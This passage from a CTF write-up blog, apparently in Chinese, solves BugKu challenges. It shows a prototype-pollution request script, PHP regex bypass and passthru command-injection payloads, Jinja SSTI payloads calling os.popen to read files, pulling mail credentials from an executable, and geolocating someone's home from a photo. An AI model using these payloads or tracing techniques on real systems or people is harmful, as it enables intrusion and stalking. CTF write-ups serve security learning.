next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.password === <span class="literal">undefined</span> || req.body.password === req.session.challenger.password)&#123;</span><br><span class="line">        res.send(<span class="string">&quot;ç™»å½•å¤±è´¥&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(req.session.challenger.age &gt; <span class="number">79</span>)&#123;</span><br><span class="line">            res.send(<span class="string">&quot;ç³Ÿè€å¤´å­åæ»´å¾ˆ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag ? process.env.flag : <span class="string">&quot;flag&#123;test&#125;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">&quot;å¯†ç é”™è¯¯ï¼Œè¯·ä½¿ç”¨ç®¡ç†å‘˜ç”¨æˆ·åç™»å½•.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/reg&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.challenger = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>: <span class="number">80</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;ç”¨æˆ·åˆ›å»ºæˆåŠŸ!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/index&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">&#x27;&lt;title&gt;BUGKU-ç™»å½•&lt;/title&gt;&lt;h1&gt;å‰ç«¯è¢«ç‚’äº†&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;./reg&quot;&gt;æ³¨å†Œ&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&quot;/update&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.challenger === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/reg&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.attrkey === <span class="literal">undefined</span> || req.body.attrval === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;ä¼ å‚æœ‰è¯¯&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.attrkey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.attrval.toString();</span><br><span class="line">            setFn(req.session.challenger, key, value);</span><br><span class="line">            res.send(<span class="string">&quot;ä¿®æ”¹æˆåŠŸ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>å‘ç°set-valueï¼Œå­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œpocåœ°å€ï¼š<code>https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</code><br> <strong>poc:</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br><span class="line">setFn(&#123;&#125;,<span class="string">&#x27;__proto__.p1&#x27;</span>,<span class="string">&quot;hacked&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.p1);</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿæºç </p><blockquote><p>1.å‘ç°è·¯ç”±&quot;/reg&quot;ä¼šåˆ›å»ºä¸€ä¸ªchallengerç”¨æˆ·å­—å…¸<br> 2.å‘ç°è·¯ç”±&quot;/update&quot;å¯ä»¥å¯¹challengerä¼ å‚é”®å€¼å¯¹ï¼ˆattrkeyå’Œattrvalï¼‰ï¼Œå¯¹challengerå­—å…¸ä¸­è¿›è¡Œä¿®æ”¹<br> 3.è·¯ç”±&quot;/getflag&quot;å¯ä»¥è·å–åˆ°flagï¼Œä½†å­˜åœ¨å‡ ä¸ªéªŒè¯ï¼Œé¦–å…ˆéœ€è¦ä¼ å‚ä¸¤ä¸ªå‚æ•°ï¼ˆkeyå’Œpasswordï¼‰è¿›æ¥ï¼Œå¹¶ä¸”å¯¹ç”¨æˆ·å­—å…¸ä¸­çš„å¹´é¾„è¿›è¡Œåˆ¤æ–­ï¼Œå¤§äº79ä¼šå¤±è´¥ï¼›å…¶æ¬¡Admin[key]éœ€è¦ç­‰äºpasswordï¼Œè€Œbody.passwordæ˜¯å¤šå°‘æˆ‘ä»¬æ˜¯ä¸çŸ¥é“çš„</p></blockquote><p>æ—¢ç„¶çŸ¥é“æ˜¯åŸå‹é“¾æ±¡æŸ“äº†ï¼Œæˆ‘ä»¬ç›´æ¥åˆ©ç”¨pocè‡ªå®šä¹‰ä¸€ä¸ªpasswordå³å¯ï¼Œè€Œå¯¹äºå¹´é¾„ï¼Œä»–æ˜¯å·²ç»å­˜åœ¨çš„å˜é‡ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥è¦†ç›–ageå˜é‡<br> å†™ä¸€ä¸ªè„šæœ¬è¿›è¡Œç›¸å¯¹åº”çš„å‘é€è¯·æ±‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Authorï¼šdota_st</span></span><br><span class="line"><span class="comment"># Dateï¼š2021/2/5 8:36</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://114.67.246.176:11468&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span> &#125;</span><br><span class="line">req = requests.session()</span><br><span class="line">test = req.get(url+<span class="string">&quot;/reg&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(test.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = req.post(url+<span class="string">&quot;/update&quot;</span>,json=&#123;<span class="string">&quot;attrkey&quot;</span>:<span class="string">&quot;__proto__.pwd22&quot;</span>,<span class="string">&quot;attrval&quot;</span>:<span class="string">&quot;pwd&quot;</span>&#125;,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = req.post(url+<span class="string">&quot;/update&quot;</span>,json=&#123;<span class="string">&quot;attrkey&quot;</span>:<span class="string">&quot;age&quot;</span>,<span class="string">&quot;attrval&quot;</span>:<span class="number">10</span>&#125;,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = req.post(url+<span class="string">&quot;/getflag&quot;</span>,json=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;pwd22&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;pwd&quot;</span>&#125;,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>è¿è¡Œåå¾—åˆ°flag<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/sodirty/LVKM00%7B%25M01%5B%40S~WPQLWU%7B2.png" alt=""></p><h3 id="ç¤¾å·¥-åˆæ­¥æ”¶é›†"><a class="header-anchor" href="#ç¤¾å·¥-åˆæ­¥æ”¶é›†">Â¶</a>ç¤¾å·¥-åˆæ­¥æ”¶é›†</h3><p>é¦–å…ˆæ‰“å¼€ç¯å¢ƒï¼Œåœ¨ç½‘ç«™æ‰¾åˆ°ä¸€ä¸ªä¸‹è½½é“¾æ¥ï¼Œå¼€å§‹ä¸‹è½½æ–‡ä»¶<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/KB%28S%60ML%28BU%7BR%4092OQPJVRA7.png" alt=""><br> å¾—åˆ°ä¸€ä¸ªexeæ–‡ä»¶ï¼Œå¼€å§‹å°è¯•å‘é€ä¸€ä¸‹<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/HW%40C~PFGC%5D%286AVT%7B~T%29K~%5DG.png" alt=""><br> æç¤ºä¼šæ”¶é›†ä¿¡æ¯ï¼Œå¯èƒ½å­˜åœ¨é€šä¿¡ï¼Œæˆ‘ä»¬ä½¿ç”¨idaè¿›è¡ŒæŸ¥çœ‹<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/QZ%25G7T%40VNRO%7BAUA8%24M4Z_RI.png" alt=""><br> å‘ç°å…³é”®ä¿¡æ¯ï¼Œè¿™é‡Œæœ‰è´¦å·å’Œå¯†ç ï¼Œè¿˜çœ‹åˆ°ä¸€ä¸ªsmtpåè®®ï¼ŒçŒœæµ‹è¿™ä¸ªå¯†ç æ˜¯æˆæƒç ï¼Œéœ€è¦é€šè¿‡smtpè¿›è¡Œç™»å½•ï¼Œå¾ˆå¤šå¸ˆå‚…éƒ½å¡åœ¨äº†è¿™ä¸€æ­¥ï¼Œå› ä¸ºä»–ä»¬éƒ½æ˜¯ç›´æ¥å»163é‚®ç®±çš„å®˜ç½‘é¡µé¢ç™»å½•ï¼Œå¯¼è‡´å…¶ä¸€ç›´ç™»å½•å¤±è´¥ã€‚æ­£ç¡®çš„åšæ³•æ˜¯æ‰¾ä¸€ä¸ªé‚®ä»¶å®¢æˆ·ç«¯æˆ–è€…Telnetè¿›è¡Œç™»å½•ã€‚<br> è¿™é‡Œæˆ‘ä½¿ç”¨äº†Foxmailè¿›è¡Œç™»å½•ï¼Œé…ç½®å¦‚ä¸‹æ‰€ç¤ºï¼Œå…¶ä»–å®¢æˆ·ç«¯å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œä½†å¤§åŒå°å¼‚<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/FP%28CSNJ%60F%5DEX%25FB%7DN%7DJTOFR.png" alt=""><br> ç™»å½•æˆåŠŸåï¼Œå‘ç°æœ‰é‚®ä»¶ä¸»äººå’Œbugkuç®¡ç†å‘˜çš„é€šä¿¡å†…å®¹ï¼Œæå–å…³é”®ä¿¡æ¯ï¼Œæˆ‘ç”¨çº¢è‰²æ ‡æ³¨äº†<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/7%5DB_%7B%40%25YW24%28INI_4A%5DM%60%405.png" alt=""><br> çœ‹åˆ°é‚®ä»¶ä¸»äººidæ˜¯<strong>mara</strong>ï¼Œå‘é€çš„é‚®ä»¶æ—¥æœŸä¸º2021å¹´2æœˆ8æ—¥ï¼Œå¹¶ä¸”æ˜¯å‰ä¸¤å¤©åˆšè¿‡äº†ç”Ÿæ—¥ï¼Œè€Œä¸”è¿˜æœ‰ä¸€å¥â€œéƒ½äºŒåçš„äººäº†â€å…³é”®è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ€»ç»“æå–ä¿¡æ¯ï¼š</span><br><span class="line">ä¸»äººï¼šmara</span><br><span class="line">ç”Ÿæ—¥ï¼š20010206</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ‹¿idå’Œç”Ÿæ—¥å»å°è¯•åå°ç™»å½•ï¼Œå‘ç°ç”¨æˆ·åå°±æ˜¯maraï¼Œå¯†ç æ˜¯ç”Ÿæ—¥<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/075X%24_FK43RK80PFENV63XP.png" alt=""><br> ç™»å½•æˆåŠŸåï¼Œç¿»äº†ä¸€ä¸‹å°±å¾—åˆ°flag<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/VBM58Q%28%40%5DN%24%60PM%25%60QVTBHXD.png" alt=""></p><h3 id="ç¤¾å·¥-è¿›é˜¶æ”¶é›†"><a class="header-anchor" href="#ç¤¾å·¥-è¿›é˜¶æ”¶é›†">Â¶</a>ç¤¾å·¥-è¿›é˜¶æ”¶é›†</h3><p>å¼€å±€ä¸€å¼ å›¾<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E8%BF%9B%E9%98%B6%E6%94%B6%E9%9B%86/qq.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡å›¾ç‰‡æå–ä¿¡æ¯ï¼š</span><br><span class="line">1.åœ°ç‚¹åœ¨å¤§é›å¡”</span><br><span class="line">2.å°ç¾ä»å®¶é‡Œå‡ºå‘ç»è¿‡äº†7ç«™ï¼Œå¹¶ä¸”å‡ºå‘çš„ç«™ç‚¹æ˜¯åœ°é“åˆå§‹ç«™</span><br><span class="line">3.å°ç¾å®¶ç¦»åˆå§‹ç«™æœ‰800ç±³å·¦å³ï¼Œç¦»ç¬¬å…­ç«™æœ‰1000ç±³ä»¥ä¸Šå·¦å³</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾äº†å¤§é›å¡”é™„è¿‘åœ°é“ç«™ï¼Œå‘ç°æœ‰ä¸€ç­åœ°é“å¯ä»¥åˆ°è¾¾å¤§é›å¡”ï¼Œå¹¶ä¸”åˆå§‹ç«™ç¦»å¤§é›å¡”æœ‰7ç«™<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E8%BF%9B%E9%98%B6%E6%94%B6%E9%9B%86/C%5DCN~859%29EZ6T5SV%29Q%40%25%40IH.png" alt=""><br> ä¹Ÿå°±æ˜¯å°ç¾å®¶ç¦»èˆªå¤©åŸæœ‰1000å¤šç±³ï¼Œç¦»éŸ¦æ›²å—æœ‰800ç±³å·¦å³ï¼Œä¸¤ä¸ªåœ°ç‚¹ç”»åœ†æ‰¾äº¤ç‚¹å³å¯ï¼Œç»¼åˆå¾—åˆ°å°ç¾å®¶å°åŒºåå­—æ˜¯å…°ä¹”å›½é™…åŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;lanqiaoguojicheng&#125;</span><br></pre></td></tr></table></figure><h3 id="No-one-knows-regex-better-than-me"><a class="header-anchor" href="#No-one-knows-regex-better-than-me">Â¶</a>No one knows regex better than me</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$zero</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="variable">$first</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;first&#x27;</span>];</span><br><span class="line"><span class="variable">$second</span>=<span class="variable">$zero</span>.<span class="variable">$first</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match_all(<span class="string">&quot;/Yeedo|wants|a|girl|friend|or|a|flag/i&quot;</span>,<span class="variable">$second</span>))&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$second</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\.\.|flag/&quot;</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Noooood hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$third</span>=<span class="variable">$first</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\\|\056\160\150\x70/i&quot;</span>,<span class="variable">$third</span>))&#123;</span><br><span class="line">            <span class="variable">$end</span>=substr(<span class="variable">$third</span>,<span class="number">5</span>);</span><br><span class="line">            highlight_file(base64_decode(<span class="variable">$zero</span>).<span class="variable">$end</span>);<span class="comment">//maybe flag in flag.php</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ¥æ”¶<code>zero</code>å’Œ<code>first</code>å‚æ•°ï¼Œç¬¬ä¸€ä¸ªiféœ€è¦å¯¹ä¸¤ä¸ªå‚æ•°å†…å®¹çš„æ‹¼æ¥ç»“æœè¿›è¡ŒåŒ¹é…ï¼Œç¬¬äºŒä¸ªiféœ€è¦å¯¹<code>first</code>è¿›è¡ŒåŒ¹é…<br> æœ€åæ˜¯ä¸€ä¸ªæ–‡ä»¶æ˜¾ç¤ºï¼Œå¹¶ä¸”æç¤ºflagåœ¨flag.phpï¼Œè€Œflag.phpç»è¿‡base64ç¼–ç åä¸º<code>ZmxhZy5waHA=</code>ï¼Œå…¶ä¸­åŒ…å«aï¼Œè¿‡äº†ç¬¬ä¸€ä¸ªæ­£åˆ™<br> æ¥ä¸‹æ¥çœ‹ç¬¬äºŒä¸ªæ­£åˆ™åŒ¹é…ï¼ŒæŒ‰ç†è¯´è¿™é‡Œçš„æ­£åˆ™å†…å®¹åº”è¯¥æ˜¯åŒ¹é…<code>\</code>æˆ–è€…<code>.php</code><br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/No%20one%20knows%20regex%20better%20than%20me/01%5DLS5CSW%29FR1D6%28R%249%7D8JJ.png" alt=""><br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/No%20one%20knows%20regex%20better%20than%20me/%5B5A90LBMULJ4F1%40W%608M3F1T.png" alt=""><br> è¿™é‡Œæœ‰ä¸ªå°å‘ç‚¹ï¼Œè®©æˆ‘è€—äº†ç‚¹æ—¶é—´ï¼Œä¸ä¸€è¡€å¤±ä¹‹äº¤è‡‚ğŸ˜¢ï¼›è¿™é‡Œå› ä¸ºphpè§£é‡Šå™¨çš„é—®é¢˜ï¼Œç¬¬ä¸€ä¸ª<code>\</code>æŠŠç¬¬äºŒä¸ª<code>\</code>å®ä¹‰äº†ä¹‹åï¼Œæ¥ç€ç¬¬äºŒä¸ª<code>\</code>åˆè½¬ä¹‰äº†<code>|</code>ï¼Œç»“æœ<code>|</code>å˜æˆäº†å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†<br> æ‰€ä»¥paylaodä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?zero&#x3D;ZmxhZy5waHA&amp;first&#x3D;|.php</span><br></pre></td></tr></table></figure><h3 id="èªæ˜çš„php"><a class="header-anchor" href="#èªæ˜çš„php">Â¶</a>èªæ˜çš„php</h3><p>æ‰“å¼€é¡µé¢ï¼Œæç¤ºæˆ‘ä»¬ä¼ å…¥å‚æ•°<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/V%7DA%7DJ%5D%256%24WOT%7BJQ%29%7BY%29C2%28Q.png" alt=""><br> æˆ‘ä»¬éšä¾¿ä¼ ä¸ªaè¯•è¯•<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/7V%2842VMA9_99B5%5DB%29Z0GK30.png" alt=""><br> å›æ˜¾å‡ºä»£ç ï¼Œè¿™é‡Œbanäº†flagå­—ç¬¦ä¸²ï¼Œè¿˜banæ‰ä¸€äº›å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œæˆ‘ä»¬è¯•è¯•èƒ½ä¸èƒ½å›æ˜¾å‡ºphpinfo<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/8WDXG9UE307%29LUL4_10%7D~%7DG.png" alt=""><br> å‘ç°å¯è¡Œï¼Œæˆ‘ä»¬ä½¿ç”¨<code>passthru()</code>å‡½æ•°æ¥é…åˆæ‰§è¡Œå‘½ä»¤<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/1U1H3H3O7_3S4FUDR%5B6T%25X4.png" alt=""><br> å‘ç°å¯ç–‘çš„æ–‡ä»¶<code>_16634</code>ï¼Œè¯»å–ä¸€ä¸‹<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%81%AA%E6%98%8E%E7%9A%84php/%5DE9MV%28NK%5B~%60%29_SKC5SHG3CC.png" alt=""><br> å¾—åˆ°flagï¼Œæœ€ç»ˆpaylaodä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;$&#123;passthru(&quot;tac ..&#x2F;..&#x2F;..&#x2F;_16634&quot;)&#125;</span><br></pre></td></tr></table></figure><h3 id="Simple-SSTI-1"><a class="header-anchor" href="#Simple-SSTI-1">Â¶</a>Simple_SSTI_1</h3><p>ä»é¢˜ç›®ä¸Šæ¥çœ‹å°±çŸ¥é“æ˜¯sstiæ¨¡æ¿æ³¨å…¥ï¼Œå¹¶ä¸”æç¤ºä¼ å‚flag<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/Simple_SSTI_1/%5B%7B42M5~I%40%7DR2402%24CSLHN%28A.png" alt=""><br> ç”¨<code>&#123;&#123;config&#125;&#125;</code>æŸ¥çœ‹é…ç½®ä¿¡æ¯ä¸€ä¸‹<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/Simple_SSTI_1/%5B%5B0%25U9R_AU1MG%5B4N%5DUT9UOX.png" alt=""><br> ç›´æ¥çœ‹åˆ°äº†flag</p><h3 id="Simple-SSTI-2"><a class="header-anchor" href="#Simple-SSTI-2">Â¶</a>Simple_SSTI_2</h3><p>è¿™æ¬¡ä¸å†é…ç½®ä¿¡æ¯ä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨osä¸­çš„popenæ¥æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ï¼Œç”¨lsæ¥æŸ¥çœ‹å½“å‰ç›®å½•<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/ssti2/O1G%5D4NUNR%7BKAO%7D94RW9%5DE%7DU.png" alt=""><br> å‘ç°flagï¼Œç›´æ¥catè¯»å–å³å¯ï¼Œpayloadä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag&#x3D;&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/ssti2/9%24X63%5DKZR%609E5NJI9W_P~KN.png" alt=""></p><h3 id="Flask-FileUpload"><a class="header-anchor" href="#Flask-FileUpload">Â¶</a>Flask_FileUpload</h3><p>æ‰“å¼€é¢˜ç›®ï¼Œçœ‹è§æ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ <br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/Flask_FileUpload/SZ_UH%28PZPP%7DWXSM1%60HA1JMR.png" alt=""><br> å³é”®æºç æœ‰æç¤ºï¼Œå‘Šè¯‰æˆ‘ä»¬æ–‡ä»¶ä¼šè¢«å½“åšpythonä»£ç æ‰§è¡Œ<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/Flask_FileUpload/1Z%24IVF%28AN%7BH%5B_N6_%5B%606NR%5DL.png" alt=""><br> æˆ‘ä»¬æ–°å»ºä¸€ä¸ªtxtï¼Œç„¶åå†™å…¥paylaodï¼Œåç¼€æ”¹æˆpngä¸Šä¼ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls ..&#x2F;&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/Flask_FileUpload/YDO%7BW0%40FWN%5DU%40O%5DW2ACBL%406.png" alt=""><br> å‘ç°äº†flagï¼Œå†æ”¹æˆcatè¯»å–flagå³å¯ï¼Œpayloadä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat ..&#x2F;flag&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/Flask_FileUpload/R%257ON161_%7BE%7DBP%5D%242F9%24G%29S.png" alt=""></p><h2 id="Misc"><a class="header-anchor" href="#Misc">Â¶</a>Misc</h2><h3 id="èŠ±ç‚¹æµé‡å¬å¬æ­Œ"><a class="header-anchor" href="#èŠ±ç‚¹æµé‡å¬å¬æ­Œ">Â¶</a>èŠ±ç‚¹æµé‡å¬å¬æ­Œ</h3><p>é¦–å…ˆä¸‹è½½æ–‡ä»¶æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å‡ºæ¥æ˜¯ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶ï¼Œäºæ˜¯ç›´æ¥ä¸¢åˆ°auä¸­æŸ¥çœ‹ä¸€ä¸‹ï¼ŒæŸ¥çœ‹é¢‘è°±å›¾<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/D2F%25%28%295~4%29CD_G96L%60E%5BH9H.png" alt=""><br> å¾—çŸ¥ä¼šæœ‰ä¸€ä¸ªbeaufort-cipheråŠ å¯†ï¼Œé‚£æˆ‘ä»¬ç»§ç»­å‰è¿›ï¼Œå†æŠŠéŸ³é¢‘æ–‡ä»¶æ”¾è¿›010ä¸­æŸ¥çœ‹<br> <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E8%8A%B1%E7%82%B9%E6%B5%81%E9%87%8F%E5%90%AC%E5%90%AC%E6%AD%8C/LVB5TU62~%7DD_H%24%29AUXOKZFD.png" alt=""><br> 